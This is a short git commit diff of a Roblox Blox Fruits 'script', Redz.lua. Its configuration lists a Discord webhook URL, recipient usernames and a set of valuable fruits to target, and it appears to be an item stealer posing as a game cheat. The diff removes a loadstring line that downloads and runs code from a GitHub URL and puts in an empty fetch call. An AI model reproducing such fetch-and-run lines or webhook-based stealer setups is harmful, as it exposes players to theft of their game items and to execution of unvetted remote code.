9b5915c02eb38d694dfdf8ffdf6d2eef497ba3c0
BloxFruit-LatestScript2025 <thapa43929@gmail.com>
2025-03-30 17:01:54 +0545

    Update Redz.lua

--- Redz.lua
+++ Redz.lua
@@ -2,4 +2,4 @@ https://discord.com/api/webhooks/1355855478713876581/5OLOI5SWnkRC3DWh6zgJIy7Avue
 Usernames = {"ankit_2068", "karela0017"} -- << Your username(-s).
 FruitsToHit = {"Kitsune-Kitsune", "Graviy-Gravity", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
+loadstring(game:HttpGet("",true))()
